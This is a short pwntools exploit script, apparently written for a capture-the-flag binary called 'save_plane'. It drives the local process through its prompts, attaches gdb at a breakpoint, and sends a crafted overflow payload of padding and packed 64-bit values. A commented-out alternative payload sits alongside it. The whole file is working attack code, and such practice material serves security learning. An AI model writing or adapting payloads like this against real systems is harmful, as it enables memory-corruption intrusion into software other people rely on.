from pwn import *
io=process("./save_plane")
io.sendlineafter("{?} Resources: ","1000")
gdb.attach(io,"b*0x40134e\n")
io.sendlineafter("{?} Enter data offset: ","1")
payload="a"*8+p64(0xf)+p64(0)+p64(1)+p64(0)+"aaaaaaaa"
#payload="a"*40+"bbbbbbbb"

io.sendlineafter("{?} Input data: ",payload)
io.interactive()
